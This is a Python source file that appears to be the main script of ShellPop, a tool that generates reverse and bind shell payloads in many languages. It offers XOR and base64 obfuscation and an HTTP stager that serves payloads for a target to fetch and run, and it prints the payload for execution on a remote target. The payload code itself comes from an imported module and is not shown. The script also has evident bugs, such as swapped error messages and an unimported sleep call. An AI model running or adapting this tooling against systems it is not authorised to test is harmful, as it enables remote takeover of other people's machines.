#!/usr/bin/env python
# Description:
# ShellPop is program to aid penetration testers
# generating quick and dirty reverse/bind shell 
# code to get on with the pentests.
# ==========
# History:
# Written by zc00l in 2018-03-7

# Contributors
# ===================================================
# LowFuel contributed to the project in 27/04/2018
#   Github: https://github.com/SouAquele
# Touhid Shaik joined the project in 29/04/2018
#   Github: https://github.com/touhidshaikh


import urllib
import pyperclip
import os
import string
from sys import exit
from argparse import ArgumentParser
from sys import stderr
from random import randint
from multiprocessing import Process

# package import
from shellpop import *


# Get current Operational System
write=stderr.write
flush=stderr.flush
version = 0.35 # updated 02/05/2018

AVAILABLE_SHELLS = [
        
        # Bind shell list
        {
            # Introducing the new Shell object to hold
            # Information about the shells. Look below.
            1: Shell("Python TCP +pty", # name 
                "bind",  # shell type
                "tcp", # protocol
                BIND_PYTHON_TCP(), # code
                os="Linux",
                arch="Independent",
                use_handler=bind_tcp_pty_handler,
                use_http_stager=LINUX_STAGERS),

            2: Shell("Python UDP", 
                "bind",
                "udp",
                BIND_PYTHON_UDP(),
                os="Linux",
                arch="Independent",
                use_handler=None,
                use_http_stager=LINUX_STAGERS),

            3: Shell("Perl TCP", 
                "bind",
                "tcp",
                BIND_PERL_TCP(),
                os="Linux",
                arch="Independent",
                use_handler=bind_tcp_handler,
                use_http_stager=LINUX_STAGERS),

            4: Shell("Perl UDP", 
                "bind",
                "udp",
                BIND_PERL_UDP(),
                os="Linux",
                arch="Independent", 
                use_handler=None,
                use_http_stager=LINUX_STAGERS),

            5: Shell("PHP TCP",
                "bind",
                "tcp",
                BIND_PHP_TCP(),
                os="Linux",
                arch="Independent",
                use_handler=bind_tcp_handler,
                use_http_stager=LINUX_STAGERS),

            6: Shell("PHP UDP",
                "bind",
                "udp", 
                BIND_PHP_UDP(),
                os="Linux",
                arch="Independent",
                use_handler=None,
                use_http_stager=LINUX_STAGERS),

            7: Shell("Ruby TCP", 
                "bind",
                "tcp",
                BIND_RUBY_TCP(),
                os="Linux",
                arch="Independent",
                use_handler=bind_tcp_handler,
                use_http_stager=LINUX_STAGERS),
            
            8: Shell("Ruby UDP", 
                "bind",
                "udp",
                BIND_RUBY_UDP(),
                os="Linux",
                arch="Independent",
                use_handler=None,
                use_http_stager=LINUX_STAGERS),

            9: Shell("Netcat (OpenBSD) TCP",
                "bind",
                "tcp",
                BIND_NETCAT_TCP(),
                os="Linux",
                arch="Independent",
                use_handler=bind_tcp_handler,
                use_http_stager=LINUX_STAGERS),

            10: Shell("Netcat+coproc (OpenBSD) UDP", 
                "bind",
                "udp",
                BIND_NETCAT_OPENBSD_UDP(),
                os="Linux",
                arch="Independent",
                use_handler=None,
                use_http_stager=LINUX_STAGERS),

            11: Shell("Netcat (Traditional) TCP", 
                "bind",
                "tcp",
                BIND_NETCAT_TRADITIONAL_TCP(),
                os="Linux",
                arch="Independent",
                use_handler=bind_tcp_handler,
                use_http_stager=LINUX_STAGERS),
            
            12: Shell("Powershell TCP",
                "bind",
                "tcp",
                BIND_POWERSHELL_TCP(),
                os="Windows",
                arch="x86 / x64",
                use_handler=bind_tcp_handler,
                use_http_stager=WINDOWS_STAGERS),
        },

        # Reverse shell list
        {
            1: Shell("Python TCP", 
                "reverse",
                "tcp",
                REV_PYTHON_TCP(),
                os="Linux",
                arch="Independent",
                use_handler=reverse_tcp_pty_handler,
                use_http_stager=LINUX_STAGERS),

            2: Shell("Python UDP",
                "reverse",
                "udp",
                REV_PYTHON_UDP(),
                os="Linux",
                arch="Independent",
                use_handler=None,
                use_http_stager=LINUX_STAGERS),

            3: Shell("PHP TCP", 
                "reverse",
                "tcp",
                REV_PHP_TCP(),
                os="Linux",
                arch="Independent",
                use_handler=reverse_tcp_handler,
                use_http_stager=LINUX_STAGERS),

            4: Shell("Ruby TCP",
                "reverse",
                "tcp",
                REV_RUBY_TCP(),
                os="Linux",
                arch="Independent",
                use_handler=reverse_tcp_handler,
                use_http_stager=LINUX_STAGERS),

            5: Shell("Perl TCP 01",
                "reverse",
                "tcp",
                REV_PERL_TCP(),
                os="Linux",
                arch="Independent",
                use_handler=reverse_tcp_handler,
                use_http_stager=LINUX_STAGERS),

            6: Shell("Perl TCP 02",
                "reverse",
                "tcp",
                REV_PERL_TCP_2(),
                os="Linux",
                arch="Independent",
                use_handler=reverse_tcp_handler,
                use_http_stager=LINUX_STAGERS),

            7: Shell("Perl UDP [nc -lkvup PORT]",
                "reverse",
                "udp",
                REV_PERL_UDP(),
                os="Linux",
                arch="Independent",
                use_handler=None,
                use_http_stager=LINUX_STAGERS),

            8: Shell("Bash TCP",
                "reverse",
                "tcp",
                BASH_TCP(),
                os="Linux",
                arch="Independent",
                use_handler=reverse_tcp_handler,
                use_http_stager=LINUX_STAGERS),

            9: Shell("Powershell TCP",
                "reverse",
                "tcp",
                REV_POWERSHELL_TCP(),
                os="Windows",
                arch="x86 / x64",
                use_handler=reverse_tcp_handler,
                use_http_stager=WINDOWS_STAGERS),

            10: Shell("TCLsh TCP",
                "reverse",
                "tcp",
                REVERSE_TCLSH(),
                os="Linux",
                arch="Independent",
                use_handler=reverse_tcp_handler,
                use_http_stager=LINUX_STAGERS),

            11: Shell("Ncat TCP",
                "reverse",
                "tcp",
                REVERSE_NCAT(),
                os="Linux",
                arch="Independent",
                use_handler=reverse_tcp_handler,
                use_http_stager=LINUX_STAGERS),

            12: Shell("Netcat (Traditional) UDP",
                "reverse",
                "udp",
                REVERSE_NC_UDP_1(),
                os="Linux",
                arch="Independent",
                use_handler=None,
                use_http_stager=LINUX_STAGERS),

            13: Shell("Netcat (Traditional) TCP",
                "reverse",
                "tcp",
                REVERSE_NC_TRADITIONAL_1(),
                os="Linux",
                arch="Independent",
                use_handler=reverse_tcp_handler,
                use_http_stager=LINUX_STAGERS),

            14: Shell("Netcat (OpenBSD) mkfifo TCP",
                "reverse",
                "tcp",
                REVERSE_MKFIFO_NC(),
                os="Linux",
                arch="Independent",
                use_handler=reverse_tcp_handler,
                use_http_stager=LINUX_STAGERS),

            15: Shell("Netcat (OpenBSD) mknod TCP",
                "reverse",
                "tcp",
                REVERSE_MKNOD_NC(),
                os="Linux",
                arch="Independent",
                use_handler=reverse_tcp_handler,
                use_http_stager=LINUX_STAGERS),

            16: Shell("Telnet mkfifo TCP",
                "reverse",
                "tcp",
                REVERSE_MKFIFO_TELNET(),
                os="Linux",
                arch="Independent",
                use_handler=reverse_tcp_handler,
                use_http_stager=LINUX_STAGERS),

            17: Shell("Telnet mknod TCP",
                "reverse",
                "tcp",
                REVERSE_MKNOD_TELNET(),
                os="Linux",
                arch="Independent",
                use_handler=reverse_tcp_handler,
                use_http_stager=LINUX_STAGERS),

            18: Shell("socat TCP",
                "reverse",
                "tcp",
                REVERSE_SOCAT(),
                os="Linux",
                arch="Independent",
                use_handler=reverse_tcp_handler,
                use_http_stager=LINUX_STAGERS),

            19: Shell("awk TCP",
                "reverse",
                "tcp",
                REVERSE_AWK(),
                os="Linux",
                arch="Independent",
                use_handler=reverse_tcp_handler,
                use_http_stager=LINUX_STAGERS),

            20: Shell("awk UDP",
                "reverse",
                "udp",
                REVERSE_AWK_UDP(),
                arch="Independent",
                use_handler=None,
                use_http_stager=LINUX_STAGERS),
        }
    ]

bind_shells = AVAILABLE_SHELLS[0]
reverse_shells = AVAILABLE_SHELLS[1]
    
def proto_colorize(shell_name):
    """
    This code is responsible to colorize
    the protocol of bind/reverse shells name.
    """
    proto_avail = [
            ("UDP", "94"), 
            ("TCP", "93")] # available protocols to colorize.
    for proto in proto_avail:
        if proto[0] in shell_name:
            shell_name = shell_name.replace(proto[0], "\033[{0}m{1}\033[0m".format(proto[1], proto[0]))
    return shell_name

def list_shells():
    bind_shells = AVAILABLE_SHELLS[0]
    reverse_shells = AVAILABLE_SHELLS[1]
    
    write(info("\033[1mBind shells\033[0m:\n\n"))
    for i in range(1, len(bind_shells)+1):
        obj = bind_shells[i]
        print("{0}. {1}".format(str(i).rjust(3), proto_colorize(obj.name)))
    
    write("\n\n")
    write(info("\033[1mReverse shells\033[0m:\n\n"))
    for i in range(1, len(reverse_shells)+1):
        obj = reverse_shells[i]
        print("{0}. {1}".format(str(i).rjust(3), proto_colorize(obj.name)))
    return 0


def generate_file_name(extension=""):
    file_name = ""
    while len(file_name) < 8:
        random_char = os.urandom(1)
        if random_char in string.letters:
            file_name += random_char
    return file_name + extension


def header():
    contributors = ["@zc00l", "@touhidshaikh", "@lowfuel"]
    return "\033[093mshellpop\033[0m v{0}\n\033[93mcontributors\033[0m: {1}\n\n".format(version, ','.join([x for x in contributors]))

def select_shell(args, shell_type, shell_index):

    # Update algorithm after the new introduced Shell object.
    # This function used to return a string, containing the 
    # final payload code. Now it returns a Shell() object.
    # This Shell() object has the final payload in the 'pay-
    # load' attribute.

    if shell_type == "reverse":
        for shell in reverse_shells:
            obj = reverse_shells[shell]
            if shell == shell_index:
                code = obj.code
                name = obj.name
                rev = ReverseShell(name, args, code)
                generated = rev.get()
                obj.payload = generated
                return obj

    elif shell_type == "bind":
        for shell in bind_shells:
            obj = bind_shells[shell]
            if shell == shell_index:
                code = obj.code
                name = obj.name
                bind = BindShell(name, args, code)
                generated = bind.get()
                obj.payload = generated
                return obj


def main():
    parser = ArgumentParser()
    
    # List mode
    parser.add_argument("--list", help="List of available shells", action="store_true")
    
    # Program parameters
    parser.add_argument("--host", type=str, help="IP to be used in connectback (reverse) shells.")
    parser.add_argument("--port", type=int, help="Port to be used in reverse/bind shell code.")
    parser.add_argument("--number", type=int, help="Shell code index number", required=False)
    parser.add_argument("--reverse", action="store_true")
    parser.add_argument("--bind", action="store_true")
    parser.add_argument("--shell", type=str, default="", help="Terminal shell to be used when decoding some encoding scheme.", required=False)

    # Available encodings
    parser.add_argument("--xor", action="store_true",help="Enable XOR obfuscation", required=False)
    parser.add_argument("--base64", action="store_true", required=False, help="Encode command in base64.")
    parser.add_argument("--urlencode", action="store_true", required=False, help="Encode the command in URL encoding.")

    # Use handler if possible.
    parser.add_argument("--handler", action="store_true", help="Use handler, if possible.", required=False)

    # Use staging
    parser.add_argument("--stager", type=str, help="Use HTTP staging for malicious shells", required=False)

    # Http-staging options
    parser.add_argument("--http-port", type=int, help="HTTP staging port to be used", required=False)

    # Send it to clipboard
    parser.add_argument("--clip", action="store_true", help="Copy payload to your clipboard automatically.", required=False)

    args = parser.parse_args()
    if args.list == True:
        write(header())
        list_shells()
        exit(0)

    if type(args.number) is not int:
        write(header())
        print(error("Error: You need to select a shell using --number. To list shells, use: --list"))
        exit(1)

    if args.reverse is True and args.bind is True:
        write(header())
        print(error("Error: You must select --reverse or --bind"))
        exit(1)

    if args.reverse is not True and args.bind is not True:
        write(header())
        print(error("Error: You can't select both --reverse and --bind options."))
        exit(1)


    if args.xor is True:
        args.xor = randint(0,255)
    else:
        args.xor = 0 # no Xor encoding!

    if args.reverse is True:
        if args.host is None:
            print(error("Error: You need to set the listener IP address with --host"))
            exit(1)
        if args.port is None:
            print(error("Error: You need to set the listener port number with --port"))
            exit(1)
        shell = select_shell(args, "reverse", args.number)
        if shell.handler is not None:
            shell.handler_args = ('0.0.0.0', args.port)
    else:
        if args.port is None:
            print(error("Error: You need to set the remote port number to listen with --port"))
            exit(1)
        shell = select_shell(args, "bind", args.number)
        if shell.handler is not None:
            if args.host is  None:
                args.host = raw_input("[\033[092m*\033[0m] Remote host IP address: ")
            shell.handler_args = (args.host, args.port)


    # This is the spot for stagers.
    # First, we need to detect if the operator
    # wants it.
    stager = None # this is a local scope variable now.
    stager_thread = None
    stager_payload = None
    if args.stager is not None:

        # He wants stager.
        if args.stager == "http": # He chose http stager.
            if shell.use_http_stager is False:
                print(info("This shell does not supports HTTP staging."))
            else:
                # This is the HTTP stager code.
                # I will try to host a HTTP server in the following ports:
                ports = [80,8080,8081]
                ports.insert(0, args.http_port) if args.http_port is not None else None

                OLD_DIR = os.getcwd()
                os.chdir("/tmp") # currently only linux.
                # /tmp because it is where we are going to host our payloads

                for port in ports:
                    stager = HTTPServer(port)
                    if stager.check_port() is True:

                        # Choose the stager option
                        if len(shell.use_http_stager) == 1:
                            shell.use_http_stager = shell.use_http_stager[0]
                        else:
                            shell.use_http_stager = choose_stager(shell.use_http_stager) # choose a stager.

                        stager_thread = Process(target=stager.start, args=())
                        stager_thread.start()
                        print(info("Started HTTP server at port {0}".format(port)))

                        payload_file = generate_file_name()
                        with open(payload_file, "w") as f:
                            f.write(shell.payload)
                        print(info("Staged file has been named '{0}'".format(payload_file)))
                        stager_payload = shell.use_http_stager((args.host, port), args, payload_file).get()
                        break
                    else:
                        print(error("Cant use port {0} as HTTP server port.".format(port)))

   
    to_be_executed = shell.payload if stager is None else stager_payload

    if args.clip is True:
        pyperclip.copy(to_be_executed)
    print(info("ShellPop code has been copied to clipboard."))

    print(info("Execute this code in remote target: \n\n{0}\n".format(to_be_executed)))
    
    if shell.handler is not None and args.handler is True:
        print(info("Starting shell handler ..."))
        shell.handler(shell.handler_args)
    else:
        print(info("This shell DOES NOT have a handler set."))
    
    # Handle staging.
    if stager is not None:
        print(info("Press CTRL+C to interrupt the HTTP stager ..."))
        try:
            while 1:
                sleep(10)
        except:
            print(info("Killing HTTP server ..."))
            stager_thread.terminate()
            os.chdir(OLD_DIR) # restore working directory.
    return 0x0

if __name__ == "__main__":
    main()
